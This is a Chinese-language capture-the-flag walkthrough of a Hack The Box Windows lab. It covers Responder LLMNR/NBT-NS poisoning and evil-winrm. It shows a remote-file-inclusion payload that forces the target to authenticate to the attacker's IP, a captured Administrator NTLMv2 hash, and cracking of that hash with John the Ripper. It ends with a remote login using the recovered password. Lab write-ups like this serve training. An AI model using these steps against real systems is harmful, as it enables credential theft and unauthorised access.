## 0x01.evil-winRM

### 0x01.1概述

在使用和介绍Responder之前，先来了解一下`evil-winRM`:

`evil-winrm`是Windows远程管理(WinRM) Shell的终极版本。

Windows远程管理是WS 管理协议的 Microsoft 实施，该协议是基于标准
SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。而微软将其包含在他们的系统中，是为了便于系统管理员在日常工作中，远程管理服务器，或通过脚本同时管理多台服务器，以提高他们的工作效率。

此程序可在启用此功能的任何Microsoft
Windows服务器上使用（通常端口为5985），当然只有在你具有使用凭据和权限时才能使用。因此，我们说它可用于黑客攻击的后利用/渗透测试阶段。相对于攻击者来说，这个程序能为他们提供更好更简单易用的功能。当然，系统管理员也可以将其用于合法目的，但其大部分功能都集中于黑客攻击/渗透测试。

### 0x01.2安装和使用

 **安装：**

方法一

    
    
    sudo apt install evil-winrm

方法二：

    
    
    git clone https://github.com/Hackplayers/evil-winrm.git

方法三：

    
    
    gem install evil-winrm

 **使用：**

首先查看帮助文档

    
    
    root@kali:~# evil-winrm -h  
    ​  
    Evil-WinRM shell v3.5  
    用法：evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r 领域] [--spn SPN_PREFIX] [-l]  
    -S, --ssl 启用 ssl  
    -c, --pub-key PUBLIC_KEY_PATH 公钥证书的本地路径  
    -k, --priv-key PRIVATE_KEY_PATH 私钥证书的本地路径  
    -r, --realm DOMAIN Kerberos auth，还必须使用此格式在 /etc/krb5.conf 文件中设置 -> CONTOSO.COM = { kdc = fooserver.contoso.com }  
    -s, --scripts PS_SCRIPTS_PATH Powershell 脚本本地路径  
    --spn SPN_PREFIX Kerberos 身份验证的 SPN 前缀（默认 HTTP）  
    -e, --executables EXES_PATH C# 可执行文件本地路径  
    -i, --ip IP 远程主机IP或主机名。 Kerberos 身份验证的 FQDN（必需）  
    -U, --url URL 远程 url 端点（默认 /wsman）  
    -u, --user USER 用户名（如果不使用 kerberos，则需要）  
    -p, --password PASS 密码  
    -H, --hash HASH NTHash  
    -P, --port PORT 远程主机端口（默认5985）  
    -V, --version 显示版本  
    -n, --no-colors 禁用颜色  
    -N, --no-rpath-completion 禁用远程路径完成  
    -l, --log 记录 WinRM 会话  
    -h, --help 显示此帮助消息

## 0x02.Responder

### 0x02.1 概念

响应 LLMNR、NBT-NS 和 MDNS 投毒者。 它将根据名称后缀回答特定的 NBT-NS（NetBIOS
名称服务）查询（请参阅：<http://support.microsoft.com/kb/163409>）。默认情况下，该工具将仅响应适用于 SMB
的文件服务器服务请求。

### 0x02.2 特性

 **内置 SMB 身份验证服务器**

默认情况下支持具有扩展安全性 NTLMSSP 的 NTLMv1、NTLMv2 哈希。 已成功测试从 Windows 95 到 Server 2012
RC、Samba 和 Mac OSX Lion。 NT4 支持明文密码，当设置`--lm`选项时，LM 哈希降级。该工具启动时默认启用此功能。

 **内置 MSSQL 身份验证服务器**

为了将 SQL 身份验证重定向到此工具，您需要为 Windows Vista 之前的系统设置选项 -r（用于 SQL Server 查找的 NBT-NS
查询使用工作站服务名称后缀）（LLMNR 将用于 Vista 和 更高）。 该服务器支持 NTLMv1、LMv2 哈希。 此功能已在 Windows SQL
Server 2005 和 2008 上成功测试。

 **内置 HTTP 身份验证服务器**

为了将 HTTP 身份验证重定向到此工具，您需要为早于 Vista 的 Windows 版本设置选项 -r（用于 HTTP 服务器查找的 NBT-NS
查询使用工作站服务名称后缀发送）。 对于 Vista 及更高版本，将使用 LLMNR。 该服务器支持 NTLMv1、NTLMv2 哈希和基本身份验证。
该服务器已在 IE 6 至 IE 10、Firefox、Chrome、Safari 上成功测试。

注意：此模块也适用于从 Windows WebDav 客户端 (WebClient) 发出的 WebDav NTLM 身份验证。
您现在可以将自定义文件发送给受害者。

 **内置 HTTPS 身份验证服务器**

与上面相同。 文件夹 certs/ 包含 2 个默认密钥，其中包括一个虚拟私钥。 这是故意的，目的是让 Responder 开箱即用。
添加了一个脚本，以防您需要生成自己的自签名密钥对。

 **内置 LDAP 身份验证服务器**

为了将 LDAP 身份验证重定向到此工具，您需要为早于 Vista 的 Windows 版本设置选项 -r（用于 HTTP 服务器查找的 NBT-NS
查询使用工作站服务名称后缀发送）。 对于 Vista 及更高版本，将使用 LLMNR。 该服务器支持 NTLMSSP 哈希和简单身份验证（明文身份验证）。
该服务器已在 Windows 支持工具"ldp"和 LdapAdmin 上成功测试。

 **内置 FTP、POP3、IMAP、SMTP 身份验证服务器**

该模块将收集明文凭据

 **内置 DNS 服务器**

该服务器将回答 A 类查询。 当它与 ARP 欺骗结合起来时，这真的很方便。

 **内置 WPAD 代理服务器**

如果启用了“自动检测设置”，此模块将捕获网络上启动 Internet Explorer 的任何人的所有 HTTP 请求。 该模块非常有效。 您可以在
Responder.conf 中配置自定义 PAC 脚本，并将 HTML 注入服务器的响应中。 请参阅 Responder.conf。

 **浏览器监听器**

该模块允许在隐身模式下找到 PDC。

 **指纹识别**

当使用选项 `-f`时，响应程序将对发出 LLMNR/NBT-NS 查询的每个主机进行指纹识别。 所有采集模块在指纹模式下仍然可以工作。

 **ICMP 重定向**

    
    
    python tools/Icmp-Redirect.py

适用于 Windows XP/2003 及更早版本上的 MITM 域成员。 这种攻击与 DNS 模块相结合非常有效。

 **流氓 DHCP**

    
    
    python tools/DHCP.py

DHCP 通知欺骗。 允许您让真正的 DHCP 服务器发布 IP 地址，然后发送 DHCP Inform 应答以将您的 IP 地址设置为主 DNS
服务器，以及您自己的 WPAD URL。

 **分析模式**

该模块允许您查看网络上的 NBT-NS、BROWSER、LLMNR、DNS 请求，而不会破坏任何响应。 此外，您还可以被动映射域、MSSQL
服务器、工作站，看看 ICMP 重定向攻击在您的子网上是否可行。

### 0x02.3 Responder欺骗原理

在使用Responder之前，我们要先了解windwos默认开启的三种协议，这三种协议分别是 **链路本地多播名称解析（LLMNR）** 、
**名称服务器(NBNS) 协议** 和 **多播DNS（mdns）协议** 。

 **LLMNR**

 **链路本地多播名称解析（LLMNR）** 是一个 **基于域名系统（DNS）**
数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。Windows 操作系统从 Windows
Vista开始就内嵌支持，Linux系统也通过systemd实现了此协议。它通过UDP 5355端口进行通信，且LLMNR支持IPV6。

 **NBNS**

 **网络基本输入/输出系统(NetBIOS)** 名称服务器(NBNS) 协议是 TCP/IP 上的 NetBIOS (NetBT)
协议族的一部分，它在基于 NetBIOS 名称访问的网络上提供主机名和地址映射方法。通过UDP 137端口进行通信，但NBNS不支持IPV6。

 **mDNS**

在计算机网络中 ， **多播DNS（ mDNS ）** 协议将主机名解析为不包含本地名称服务器的小型网络中的IP地址。 它是一种零配置服务，使用与
**单播域名系统（DNS）** 基本相同的编程接口，数据包格式和操作语义。 虽然Stuart
Cheshire将mDNS设计为独立协议，但它可以与标准DNS服务器协同工作。它通过UDP 5353端口进行通信，且mDNS也支持IPV6。

目前仅有windows 10以上的系统支持mdns，经测试发现，禁用了llmnr后mdns也会被禁用。

总的来说，以上几种协议在windows中都是默认启用的，主要作用都是在DNS服务器解析失败后，尝试对windows主机名称进行解析，正因为默认启用、且实现方式又类似于ARP协议，并没有一个认证的过程，所以就会引发各种基于这两种协议的欺骗行为，而Responder正是通过这种方式，欺骗受害机器，并使受害机器在后续认证中发送其凭证。

### 0x02.4 使用方法

    
    
    root@kali:~#responder -h  
    ​  
    用法：responder -I eth0 -w -d  
    或者：  
    responder -I eth0 -wd  
    ​  
    选项：  
    --version 显示程序的版本号并退出  
    -h, --help 显示此帮助消息并退出  
    -A, --analyze 分析模式。 此选项允许您查看NBT-NS，  
    BROWSER、LLMNR 请求没有响应。  
    -I eth0，--接口=eth0  
    要使用的网络接口，可以使用“ALL”作为  
    所有接口的通配符  
    -i 10.0.0.21,--ip=10.0.0.21  
    要使用的本地 IP（仅适用于 OSX）  
    -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed  
    使用其他 IPv6 地址对所有请求进行毒害  
    响应者之一。  
    -e 10.0.0.22, --externalip=10.0.0.22  
    使用其他 IP 地址毒害所有请求  
    响应者之一。  
    -b, --basic 返回基本 HTTP 身份验证。 默认值：NTLM  
    -d, --DHCP 启用 DHCP 广播请求的应答。 这  
    选项将在 DHCP 响应中注入 WPAD 服务器。  
    默认值：假  
    -D, --DHCP-DNS 该选项将在 DHCP 中注入 DNS 服务器  
    响应，否则将添加 WPAD 服务器。  
    默认值：假  
    -w, --wpad 启动 WPAD 恶意代理服务器。 默认值为  
    错误的  
    -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY  
    恶意 WPAD 代理使用的上游 HTTP 代理  
    传出请求（格式：主机:端口）  
    -F, --ForceWpadAuth 对 wpad.dat 文件强制进行 NTLM/Basic 身份验证  
    恢复。 这可能会导致登录提示。 默认：  
    错误的  
    -P, --ProxyAuth 强制 NTLM（透明）/基本（提示）  
    代理的身份验证。 WPAD 不需要  
    在。 这个选项非常有效。 默认值：假  
    --lm 强制 Windows XP/2003 和 LM 哈希降级  
    早些时候。 默认值：假  
    --disable-ess 强制 ESS 降级。 默认值：假  
    -v, --verbose 增加详细程度。

## 0x03 靶场实战--Responder与evil-winRM配合远程登录windows

测试环境：

    
    
    kali （攻击机）   192.168.154.128   
    vpn接入内网环境: ip -> 10.10.14.115  
    ​  
    HTB靶机 windows 10 （受害机） 10.129.48.161

开启靶机

![image-20230806235738164](https://image.3001.net/images/20230816/1692167648_64dc6de0e9a1db5e2770e.png!small)

前置的步骤简单过一下：

> TASK 1
>
> When visiting the web service using the IP address, what is the domain that
> we are being redirected to?
>  
>  
>     unika.htb
>
>  
>

直接curl探测一下就行

![image-20230807004726426](https://image.3001.net/images/20230816/1692167650_64dc6de21d6e13af0baf9.png!small)

访问域名需要在本地的hosts文件就行一个配置：

![image-20230807010259553](https://image.3001.net/images/20230816/1692167651_64dc6de3123f7abca8a6b.png!small)

> TASK 2
>
> Which scripting language is being used on the server to generate webpages?
>  
>  
>     PHP
>
>  
>

直接使用 **wappalyzer** 插件即可

![image-20230807005131865](https://image.3001.net/images/20230816/1692167652_64dc6de45a80c517e8de2.png!small)

> TASK 3
>
> What is the name of the URL parameter which is used to load different
> language versions of the webpage?
>  
>  
>     page
>
>  
>

查看网页源代码：

![image-20230807005737023](https://image.3001.net/images/20230816/1692167654_64dc6de6b4a56b627f331.png!small)

> TASK 4
>
> Which of the following values for the `page`parameter would be an example of
> exploiting a Local File Include (LFI) vulnerability: "french.html",
> "//10.10.14.6/somefile",
> "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
>  
>  
>     ../../../../../../../../windows/system32/drivers/etc/hosts
>
>  
>

这里熟悉 **文件包含漏洞(FI)** 师傅能直接get到点：

![image-20230807010014461](https://image.3001.net/images/20230816/1692167655_64dc6de7b5c3d1b1ae5fa.png!small)

> TASK 5
>
> Which of the following values for the `page`parameter would be an example of
> exploiting a Remote File Include (RFI) vulnerability: "french.html",
> "//10.10.14.6/somefile",
> "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
>  
>  
>     //10.10.14.6/somefile
>
>  
>

这里和上一问同理

> TASK 6
>
> What does NTLM stand for?
>  
>  
>     NT (New Technology) LAN Manager (NTLM)
>
>  
>

查阅Wiki百科就行（可以往下深入了解，这是内网的开始......![image-20230807010533593](https://image.3001.net/images/20230816/1692167657_64dc6de909626e0ffec16.png!small)

> TASK 7
>
> Which flag do we use in the Responder utility to specify the network
> interface?
>  
>  
>     -I
>
>  
>

通过上面的帮助文档可以知道

> TASK 8
>
> There are several tools that take a NetNTLMv2 challenge/response and try
> millions of passwords to see if any of them generate the same response. One
> such tool is often referred to as `john`, but the full name is what?.
>  
>  
>     John the Ripper
>
>  
>

也是查阅Wiki百科即可

![image-20230807010848902](https://image.3001.net/images/20230816/1692167658_64dc6dea2fd61d359a7cc.png!small)

### 本文的关键操作，可直接跳至此处

接下来将是本文的重点操作：

首先查看一下自身ip（vpn），并开启监听

![image-20230807012015738](https://image.3001.net/images/20230816/1692167659_64dc6deb94083dffa1fdd.png!small)

开启监听：`responder -I tun0 -w -d`

![image-20230807012128742](https://image.3001.net/images/20230816/1692167660_64dc6decf40fff4647558.png!small)

![image-20230807012239477](https://image.3001.net/images/20230816/1692167662_64dc6dee39099a43488eb.png!small)

接着利用web端的 **远程文件包含漏洞(RFI)** 访问我自身(10.10.14.115)的任意文件，进行一个Hash泄露

 **payload：**

    
    
    http://unika.htb/index.php?page=//10.10.14.115/somefile

Responder就可以捕获到来自受害机(10.129.48.161)带有 **用户的密码(password)的Hash值**

![image-20230807012755978](https://image.3001.net/images/20230816/1692167663_64dc6defbd074b1f0f4c8.png!small)

    
    
    Administrator::RESPONDER:9baf19c29ef21567:761FED4C7E3DB9BCFEF3E747E797B10D:010100000000000000E56ED168C8D901D119B9B66118B37A00000000020008004E0044004200450001001E00570049004E002D004C004C0047004200590033003100340035005800510004003400570049004E002D004C004C004700420059003300310034003500580051002E004E004400420045002E004C004F00430041004C00030014004E004400420045002E004C004F00430041004C00050014004E004400420045002E004C004F00430041004C000700080000E56ED168C8D901060004000200000008003000300000000000000001000000002000008400CDB8B7CEB11867758BC8795830343D40C19570BB7035C3D1AF789B7CE19F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100310035000000000000000000

将这段字符串保存到一个txt文件中，接下来使用JHON进行一个Hash爆破：

    
    
    john -w=/usr/share/wordlists/rockyou.txt admin.txt

![image-20230807013110709](https://image.3001.net/images/20230816/1692167666_64dc6df20377ac3ce0373.png!small)

能够获取到Administrator用户的密码为：badminton

> TASK 9
>
> What is the password for the administrator user?
>  
>  
>     badminton
>
>  
>

> TASK 10
>
> We'll use a Windows service (i.e. running on the box) to remotely access the
> Responder machine using the password we recovered. What port TCP does it
> listen on?
>  
>  
>     5985
>
>  
>

使用nmap进行一个开放端口探测即可：

    
    
    nmap -p- --min-rate 1000 -sV 10.129.48.161

![image-20230807013453353](https://image.3001.net/images/20230816/1692167667_64dc6df358665041fd1a3.png!small)

拿到用户的账户和密码之后就到了一开始所提到的evil-winRM的使用了

    
    
    evil-winrm -i 10.129.48.161 -u administrator -p badminton

![image-20230807013831906](https://image.3001.net/images/20230816/1692167668_64dc6df4bb8737f03b196.png!small)

这样就可以远程登录windows服务器啦，接下来我们能做到的事儿有很多。

第一步肯定是找题目需要的flag

![image-20230807014120801](https://image.3001.net/images/20230816/1692167670_64dc6df63a895e94cdb70.png!small)

找到我们需要的flag文件只是最基础的，别着急提交，不然就浪费这个练习工具的好机会了

可以多试试几个命令：

 **menu** ：加载Invoke-Binary和l04d3r-LoadDll函数。当加载ps1时，会显示其所有功能。

![image-20230807014438379](https://image.3001.net/images/20230816/1692167671_64dc6df779bb24b24b217.png!small)

 **download** ：下载远程文件到本地，如果远程文件在当前目录中，则不需要local_path。

    
    
    download local_path remote_path

这里可以尝试一下下载flag.txt

![image-20230807014805570](https://image.3001.net/images/20230816/1692167672_64dc6df8d4df6ae57a8f3.png!small)

 **upload** ：从本地（kali）上传文件到目标机器，如果本地文件与evil-winrm.rb文件位于同一目录中，则不需要remote_path。

    
    
    upload local_path remote_path

这里可以试着传一个txt文件

![image-20230807015126775](https://image.3001.net/images/20230816/1692167674_64dc6dfa6c4d998e660e6.png!small)

 **Invoke-Binary** ：允许在内存中执行从c#编译的exe。该名称可使用tab键自动补全，最多允许3个参数。可执行文件必须在-e参数设置的路径中。

![image-20230807015427827](https://image.3001.net/images/20230816/1692167675_64dc6dfbb3982e9c6c872.png!small)

这里由于我在连接时并未指定exe的路径所以这里没法正常执行命令。

 **services：** 列出所有服务（无需管理员权限）

![image-20230807015616926](https://image.3001.net/images/20230816/1692167677_64dc6dfd19f4ed1df4928.png!small)

 **加载 powershell 脚本**

要加载ps1文件，你只需键入名称（可以使用tab自动补全）。脚本必须位于-s参数中设置的路径中。再次键入menu并查看加载的功能。

这里我没指定路径所以是没有powershell脚本的，所以没法正常演示。

### 最后

本次的分享就到这儿结束了，当然还有很多的操作和细节没有能够展示到，后续就留给师傅们去探索了。

  

